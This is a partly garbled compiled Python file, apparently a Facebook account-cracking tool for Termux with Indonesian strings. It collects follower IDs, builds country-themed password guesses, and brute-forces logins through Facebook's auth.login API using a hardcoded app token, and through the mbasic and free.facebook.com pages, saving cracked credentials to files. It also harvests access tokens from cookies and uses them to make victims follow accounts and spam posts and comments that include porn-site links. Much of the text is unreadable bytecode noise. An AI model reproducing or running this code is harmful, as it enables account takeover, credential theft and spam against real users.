d }~0 0 d S )7Nr�  r�  r   r   r   r�  r�  r�   r�  r�  r  r�  r�  � Followers ID Target 04 : z Followers ID Target 05 : r�  r�  r�   r�  r�   r(   r�   r   r�  r�  r  r  r�  r�  r;   r�  r�  r�   r�  r�  r  r�  rs  r�   rt  r�   rC   r�   ru  r   r}  r�  r�  r�  r�  r�  r�  r�  r�  )r�   r    r�   r9   r"   r#   r   r�   r   r�  rN   rO   r�   rm   r   rs   rP   rS   r�   r�   rU   r�   r  rP  r~   r�   r�   r�  r�   r�   )r~  r�  r�  r�  r�  r�  r�   r�  r�  r(   r�   r�   r�  r�  re   r�   r$   r$   r%   r�    s   $
$
$
$

$

$$
($$
0$ 
"0*
"0*
"0*
"0*
",    r�  c               
   C   s�  t td � tt� d�� ttd t d t d t d �} t| �dk rtt | dv rXd	ntd
 � t�d� t	�  q>ttd t d t d t d �}t|�dk r�t |dv r�d	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r,t |dv �rd	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r�t |dv �rnd	ntd
 � t�d� t	�  �qPt td t d t d t d � ttd t d t d t d �}t|�dk �r.t |dv �r�d	ntd � t�d� ttd t d t d t d �}�q�zt
dd��� }W nl t�y�   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z�zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�yb   ttd t d t d t d � ttd t d  t d! t � t�  Y n0 t�d|  d" | d# | �}g }	t�|j�}
|d$ d% �d&d'�}t
|d(�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �zzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �zLzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  ttd t d t d t d.t|	�  � t|�W W W W S  t�y� } z6t td/ � t td0 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�y } z6t td/ � t td2 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�yn } z6t td/ � t td3 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�y� } z6t td/ � t td4 � ttd1 � t�  W Y d }~n
d }~0 0 d S )5Nr�  r�  r   r   r   r�  r�  r�   r�  r�  r  r�  r�  r�  r�  r�  r�   r�  r�   r(   r�   r   r�  r�  r  r  r�  r�  r;   r�  r�  r�   r�  r�  r  r�  rs  r�   rt  r�   rC   r�   ru  r   r}  r�  r�  r�  r�  r�  r�  r�  )r�   r�   r    r9   r"   r#   r   r�   r   r�  rN   rO   r�   rm   r   rs   rP   rS   r�   r�   rU   r�   r  rP  r~   r�   r�   r�  r�   r�   )r~  r�  r�  r�  r�  r�   r�  r�  r(   r�   r�   r�  r�  re   r�   r$   r$   r%   r�  �  s�    $
$
$
$

$$
($$
0$ 
"0*
"0*
"0*
",   r�  c               
   C   sL  t td t d t d t d �} t| �dk rZt| dv r>dntd � t�d	� t�  q$ttd t d t d t d
 � t td t d t d t d �}t|�dk r�t|dv r�dntd � t�d	� t td t d t d t d �}q�zt	dd��
� }W nl t�yt   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z~zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W nX t�y$   ttd t d t d t d � ttd t d t d t � Y n0 t�d|  d | d | �}g }t�|j�}|d d  �d!d"�}t	|d#�}	|d$ D ]>}
|�|
d% d& |
d  � |	�|
d% d& |
d  d' � �qz|	��  ttd t d t d t d(t|�  � t|�W S  t�yF } z6ttd) � ttd* � t td+ � t�  W Y d }~n
d }~0 0 d S ),Nr   r   r   r�  r�  r�   r�  r�  r  r�  r�  r�   zWajib 3 Angka !!r�   r(   r�   r   r�  r�  r  r  r�  r�  r;   r�  r�  r�   r�  r�  r  r�  rs  r�   rt  r�   rC   r�   ru  r   r�  r�  r�  r�  )r9   r"   r#   r   r�   r�   r�   r   r�  rN   rO   r�   r    rm   r   rs   rP   rS   r�   r�   rU   r�   rP  r~   r�   r�   r�  r�   r�   )r~  r�  r�   r�  r�  r(   r�   r�   r�  r�  re   r�   r$   r$   r%   r�  	  sT    $
$$
&$$
0$&
",
r�  c                 C   s�  t td t d t d t d t d t d t d � t td t d	 t d t d
 t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � ttd t d t d t d �}|dv �rLt td t d t d t d � t| � n�|dv �r`t| � n�|dv �rtt| � np|dv �r�tdd�}|�	d� |�
�  t| � n@|dv �r�t| � n,t td t d t d t d � t| � d S )Nr�   r*   r   z Api r�   z SPAM CRACK 57% r�   r   r�   z Mbasic z SPAM CRACK 10% r�   z Api + Ttl z SPAM CRACK 43% r�   z Free Facebook z SPAM CRACK 0%r   r�   r�   r   r�   r�   r�   r�   r�   r�   �lppr�   )r    r"   r#   ra   r9   r�  �bapi�crackrN   r�   r�   �bapittl�crackffb)r2  �krahro  r$   r$   r%   r�  G	  s*    <<<<$
$










$r�  c                 C   s�  g }t dd��� }| �d�D �]�}t|�dk r2qq|�� }t|�dks^t|�dks^t|�dkr�|�|d � |�|d � |�|d	 � q|�|� d
|v r�|�d� |�d� |�d� |�d� |�d� |�d� |�d� qd|v �r|�d� |�d� |�d� |�d� qd|v �rB|�d� |�d� |�d� qd|v �rv|�d� |�d� |�d� |�d� qd|v �r�|�d� qd|v �r�|�d� |�d� |�d� |�d� |�d� |�d� |�d � qd!|v r|�d� q|S )"Nr�   r(   r�   r�   �   r�  Z123Z1234Z12345r�   ZsayangZ	bismillahZanjingrg  Z	indonesiaZbajinganZ123456r�   Z786786Z000786Z102030Z556677r�   Zpakistanr�   ZqwertyZiloveyouZ	passwordsr�  �allZbangsatZ	katasandiZv1)rN   rO   r�   r   ri   r~   )rU   r&   Zctra   r$   r$   r%   �generate_	  s\    $

























r�  c                  C   s�   t dd��� } d| v r d}d}nFd| v r2d}d}n4d	| v rDd
}d}n"d| v rVd}d}nd| v rfd}d}ttd t | � ttd t | � d S )Nr�   r(   r�   r�   zdname123,name1234,name12345,name321,name4321,sayang,bismillah,anjing,kontol,indonesia,bajingan,123456r�   r�   z102030,556677,000786,786786r�   r�   z000786,786786,pakistanr�   r�   z passwords,qwerty,iloveyou,123456r�  zIndonesia + TTLz"name123,name1234,name12345,name321z*You Are Using A Password From The Country zPassword Now Used : )rN   rO   r    r�   r"   )r�   r�   r  r$   r$   r%   �
kata_risky�	  s$    r�  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�  c                 C   s&   d| _ g | _g | _d| _| �|� d S �NFr   ��setpw�okrJ   �loopr�  ��self�isifiler$   r$   r%   �__init__�	  s
    zbapittl.__init__c              
   C   s  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �qqJ|dv rJz�z$|| _t| j��� �	� | _
W �qW n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qY n0 �qW n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �qqJd S )Nr   r   r   r   �& Do You Want To Use Manual Password?? �[ �Y/nr�  z Dumai-991 : r�   r   � Invalid Number�r&  r%  � %s�" Example : sayang,bismillah,123456� Password List : �,r   ru  �r�   �pw�  %sr�   � Crack Started...� Account [OK] Saved to : ok.txt�  Account [CP] Saved to : cp.txt
�   r!  r   )r�  r    r"   r#   �hr9   �apkrN   rO   r1  �fsr�   �flr�   r�  r   r~   �
ThreadPool�map�bruter	   r�  rm   �remove�r�  r�  rj   r�   ra   r$   r$   r%   r�  �	  sj    D$$

($$,
""d
(
.
dzbapittl.krahc           	   
   C   s�  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r~z<t �dt|� d t	dd���  �}t�|j�}|d aW n   Y n0 | j�|d | d t � td||tf � t	dt
 d d�}|�t|�d t|� d tt� d � |��  dS dS )N�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�JSONr�   �en_US�iosr*   � 3f555f99fb61fcd7aa0c44f58f522ef6�	Zaccess_tokenr0  Zsdk_versionr<   Zlocaler]  ZsdkZgenerate_session_cookiesZsig�,https://b-api.facebook.com/method/auth.login��params�	(EAAA)\w+r  �2[0;32m[[0;37mOK[0;32m] %s|%s %s               �	Hasil/OK-r  re   r   T�www.facebook.com�	error_msgr  r�  r�   r(   r�  z*[0;33m[[0;37mCP[0;33m] %s|%s|%s[0m   zCP-r}  F)rP   rS   rW   rW  rU   r�  r~   r    r#  rN   r�   r�   r!   r�   r�   rO   r�   �ttlrJ   )	r�  r\  r]  r  �api�response�saveZkeZttr$   r$   r%   �bruteRequest�	  s0    $*zbapittl.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S )	NFr   r�  r�   T�o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m[[0;37mOK : %s[0;32m] [0;33m[[0;37mCP : %s[0;33m][0;37mr�   ��end)r�  r�  ri   r  r    r   r�  r�  rJ   r�   r   r�   �users�r�  r�  r�  r\  r]  r$   r$   r%   r�  �	  s*    


:

zbapittl.bruteN��__name__�
__module__�__qualname__r�  r�  r  r�  r$   r$   r$   r%   r�  �	  s   :r�  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�  c                 C   s&   d| _ g | _g | _d| _| �|� d S r�  r�  r�  r$   r$   r%   r�  
  s
    zbapi.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr   r   r   r   r�  r�  r�  r�  z Dumai-991 ?: r�   r   r�  r�  r�  r�  r�  r�  r   ru  r�  r�  r�   r�  �" Account [OK] Saved to : Hasil/OK-r  �" Account [CP] Saved to : Hasil/CP-�.txt
r�  r!  r   )r�  r    r"   r#   r�  r9   r�  rN   rO   r1  r�  r�   r�  r�   r�  r   r~   r�   r�  r�  r�  r	   r�  rm   r�  r�  r$   r$   r%   r�  
  sj    D$$

($$,
""t
(
.
tz	bapi.krahc              
   C   s$  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r | j�|d | � td||tf � t	dt
 d d�}|�t|�d t|� d � |��  dS dS )Nr�  r�  r�   r�  r�  r*   r�  r�  r   r  r  r  r  r  r  re   r   Tr  r  z2[0;33m[[0;37mCP[0;33m] %s|%s %s               r  r}  F)rP   rS   rW   rW  rU   r�  r~   r    r#  rN   r�   r�   r!   r�   r�   rJ   )r�  r\  r]  r  r	  r
  r  r$   r$   r%   r  W
  s&    zbapi.bruteRequestc              	   C   s<  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]�}td �� }|�� }z| �||�dkr�W  �q8W n   Y q�Y n0 td	t d
| jt| j�t| j�t| j�f  dd� t	j
��  q�d S )NFr   r�  r�   Tzo[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37mr�   r  z[0;33m[[0;37mzZ[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37m)r�  r�  ri   r  r    r   r�  r�  rJ   r�   r   r�   r  r�   r  r$   r$   r%   r�  m
  s*    


:

z
bapi.bruteNr  r$   r$   r$   r%   r�  
  s   :r�  c                   @   s:   e Zd Ze�d� e�  e�  dd� Zdd� Zdd� Z	dS )	r�  r�   c              
   C   sB  g | _ g | _d| _tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�qVqV|dv �r�z�z"|| _t	| j��
� �� | _W q�W q� ty� } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �q Y n0 �q W n> t�yz } z$td| � W Y d }~qVW Y d }~n
d }~0 0 ttd t d t d t d � | ��  �q>qV|dv rVz�z$|| _t	| j��
� �� | _W �q"W n@ t�y } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q>qVd S )Nr   r   r   r   r   r�  r�  r�  r�  r�   r   r$  �   %sr�   ru  r�  )r#  r"  r   r�  r�   r�  r�  r�  �#   )�adarJ   �kor    r"   r#   r�  r9   r�  rN   rO   r1  r�  r�   r�  r~   r�   �pwlistr�  r�  r�  �mainrm   r�  r	   r�  r$   r$   r%   r�  �
  s^    D$
$
"$
(
."dzcrackffb.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t d t d t d t d � t
d��| j| j� t�| j� t�  d S )Nr   r   r   r�  r�  r   r�  r�   r�  r�  r�  r�  )r9   r"   r#   r�   r�  r   r  r�  rR   r    r�  r�  r  rm   r�  r�  r	   �r�  ra   r$   r$   r%   r  �
  s    ,

dzcrackffb.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�  r�   zhttps://free.facebook.comrG   rJ   �/[0;33m[[0;37mCP[0;33m] %s|%s               �%s|%sr  r  r}  �%s|%s
rE   �/[0;32m[[0;37mOK[0;32m] %s|%s               zOK-r   r  r�   r  )rS   rc   r    rJ   r~   rN   r�   r�   r  r  r   r�  r�   r   r�   r  �r�  r�  ra   Zlogr$   r$   r%   r  �
  s0    
���:zcrackffb.mainN)
r  r  r  rm   r   r�   r�  r�  r  r  r$   r$   r$   r%   r�  �
  s   
3r�  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�  r�   c              
   C   sn  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dks�|dk�r�z�z$|| _	t
| j	��� �� | _W �qW q� t�y } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qjq\|dk�s�|dkr\z�z$|| _	t
| j	��� �� | _W �q>W n@ t�y8 } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qJY n0 �qJW n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qjq\d S )Nr   r   r   r   r   r�  r�  r�  r�  r�   r   r%  r&  r  r�   ru  r�  r#  r"  r   r�  r�   r�  r  r  r  r  r  )r  rJ   r  r�  r    r"   r#   r�  r9   r�  rN   rO   r1  r�  r�   r�  r~   r�   r  r�  r�   r�  r�  r  rm   r�  r	   r�  r$   r$   r%   r�  �
  s`    D$
$
"$
(
."tzcrack.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S )Nr   r   r   r�  r�  r   r�  r�   r�  r  r  r  r  r�  )r9   r"   r#   r�   r�  r   r  r�  rR   r    r�   r�  r�  r  rm   r�  r�  r	   r  r$   r$   r%   r    s    ,

tzcrack.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�  r�   zhttps://mbasic.facebook.comrG   rJ   r   r!  r  r  r}  r"  rE   r#  r  z.txt.txtr   r  r�   r  )rS   rb   r    rJ   r~   rN   r�   r�   r  r  r   r�  r�   r   r�   r  r$  r$   r$   r%   r    s0    
���:z
crack.mainN)	r  r  r  rm   r   r�   r�  r  r  r$   r$   r$   r%   r�  �
  s
   
4r�  c                  C   sB  t �d� t�  ttd t d t d t d � ttd t d t d t d � ttd t d	 t d t d
 � ttd t d t d t d �} | dkr�ttd t d t d t d � t�  nj| dkr�t�  t	�  nT| dk�rt�  t
�  n<| d	k�rt�  n*ttd t d t d t d � t�  d S )Nr�   r�   r*   r   z Login Tokenr   r�   z Login Cookiesr>   z Exitr   r�   r   r   r�   )rm   r   r�   r    r"   r#   r9   rs   rm  �	log_token�genr	   )Zsekr$   r$   r%   rs   6  s&    
$$$$$

$rs   c               	   C   sF   d} z t dd�}|�| � |��  W n ttfy@   t�  Y n0 d S )Nru   r'   r�   )rN   r�   r�   r�   r�   rs   )r_   Zugentr$   r$   r%   �	defaultuaM  s    

r'  c                  C   s  t �d� t�  ttd � ttd � ttd t d t d t d �} zlt�	d|  �}t
�|j�}|d	 }td
d�}|�| � |��  ttd t d t d t d � t�  W nF ty�   ttd t d t d t d � t �d� t�  Y n0 d S )Nr�   zJYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile�0LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxxr�   r   r   z	 Token : z+https://graph.facebook.com/me?access_token=r;   r�   r�   � Login Successfulr   r   rq  )rm   r   r�   r    r�   r9   r"   r#   rP   rS   r�   r�   rU   rN   r�   r�   �
bot_followr�   rs   )r�   r�   re   r�   Zzeddr$   r$   r%   r%  U  s$    
$

$
$
r%  c                  C   sn  t �d� t�  td� td� ttd t d t d t d �} zTtjdd	d
dddddddd�	d| id�}t	�
d|j�}|d u r�dnd|�d� }W n� tjjy�   ttd t d t d t d � Y nL ttg�y   ttd t d t d t d � t �d� t�  Y n0 tdd�} | �|�d�� | ��  ttd t d t d t d � t�  d S ) Nr�   zMYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...r(  r�   r   r   z
 Cookies: zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comr*   r-   r)   r+   ztext/html; charset=utf-8)	r2   rA   rz   rx   r1   r5   r0   r3   ry   �cookierd   z	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r   r   r   z No Connectionz Cookies Invalidr�   r�   r)  )rm   r   r�   r    r9   r"   r#   rP   rS   rW   rW  rU   rX  r�   r�   r�   r�   rs   rN   r�   r�   r*  )r+  rC   Z
find_tokenZhasilr$   r$   r%   r&  i  sB    
$���($

$r&  c                  C   s�  zJt dd��� } t dd��� }t�d|  �}t�|j�}|d }|d }W nF ty�   tt	d t
 d t	 d t
 d	 � t�d
� t�  Y n0 ttd t � ttd t	 | � ttd t	 | � d}d}d}d}	d}
d}d}d}d}d}d}d}d}d}d}d}d}t|d | |d | g�}t|d | |d | g�}t||g�}d }t�d!|	 d" | d# | � t�d!|
 d" | d# | � t�d!| d" | d# | � td$� t�d%|  � t�d&|  � t�d'|  � td(� t�d!| d" | d# | � t�d!| d" | d# | � t�d!| d" | d# | � t�d!|	 d" | d# | � t�d!|
 d" | d# | � t�d!| d" | d# | � t�d!| d" | d# | � td)� t�d!| d* |  � t�d!| d* |  � t�d!| d* |  � t�d!|	 d* |  � t�d!|
 d* |  � t�d!| d* |  � t�d!| d* |  � td+� t�d,| � t�d-| � t�d.| � t�d/| � t�d0| � td1� t�d2� t�  d S )3Nr�   r(   r�   r;   r�   r�   r   r   rq  r   zTunggu Sebentar...zYour Name   : zYour ID     : Z4111448792295892Z120338706765807Z167879918678352Z180923747373969Z172628718203472Z198550702277940Z198552118944465zJXNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COMz"@[100063690353340:0] LOVE ZERO TWOz]https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fblz\https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fblz]https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fblzGhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198550702277940/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198552118944465/?app=fblz8Yandex.com
Unblock.com
Ml.Ratuku.Top
Jomblo.Top
Xnxx.comzHhttps://www.facebook.com/100002924366263/posts/4111450325629072/?app=fblr   r  r  r  r  zTunggu Sebentar 05r  z~https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100063690353340/posts/198552118944465/?app=fbl&access_token=z�https://graph.facebook.com/me/feed/?link=https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl&access_token=zTunggu Sebentar 04zTunggu Sebentar 03r  zTunggu Sebentar 02zDhttps://graph.facebook.com/100063690353340/subscribers?access_token=zDhttps://graph.facebook.com/100067783659018/subscribers?access_token=zDhttps://graph.facebook.com/100002924366263/subscribers?access_token=zDhttps://graph.facebook.com/110877271176800/subscribers?access_token=zWhttps://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=z, [0;97m[[0;92m+[0;97m] Login Successfullyr   )rN   rO   rP   rS   r�   r�   rU   r�   r    r"   r#   r�   r   rs   r�   r�   r�   �pilihrY   r�   )r�   r  r�   re   r�   r�   Zpost1Zpost2Zpost3Zpost4Zpost5Zpost6Zpost7ZkomZkom2Zkom3Zkom4Zkom5Zkom6Zkom7Zkom8Zkom9Zkom10r  Zkom_2Zkom_3r  r$   r$   r%   r*  �  s�    $

r*  c                   C   s&  t �d� t�  ttd t d t d t � ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � t	�  d S )Nr�   r�  zResult Crack -- Hasil Crackr�  ZOKzcat Hasil/OK*.txtr   r   r   r   ZCPzcat Hasil/CP*.txtr�   )
rm   r   r�   r    r"   r#   r�  r�   r9   r�   r$   r$   r$   r%   r  �  s    
  * * r  c                   @   s   e Zd Ze�d� e�  dS )r�  �git pullN)r  r  r  rm   r   r�   r$   r$   r$   r%   r�  �  s   
r�  �__main__r-  )T)rl  )�r�   Zh2Zb2Zc2Zi2Zu2Zm2Zp2Zk2r`   ra   r�   r�   r�   r"   r#   r�  Z	itertoolsZ	threadingrm   rP   rT   r�   r�   r
   r�   rW   r�   r(  r   ZYayanGantengr   r   r   r	   ZkeluarZwaktuZacakr   r,  r   r   Z	mechanizeZuuid�base64Z
concurrentr   r�  r   r   ZsettingZnowZcurrentr(   rn   ro   rp   rN   rO   rr   r^  r�  rJ   r  r!   �strftimer�   ZyearZtahunZmonthZbulanZdayZhari�or	  r�   r�   Zbulat2Zwar2Zinp2rS   rU   ZexpZserZlogo_expr    Zlogo_mtr�   r�   �platformri   r#  �G�O�Rr&   rb   rc   rl   rt   rg   r�   rq   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r  r2  r/  r+  r*  rI  rK  rV  rY  ri  rb  rc  rZ  rH  r  rm  r  r  r�   r�  r  r
  r  r�  r  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  rs   r'  r%  r&  r*  r  r�  r  r$   r$   r$   r%   �<module>   sR  `h


	 
/1  S 3
!


0 1# 2W} I@a v,1snYY$K

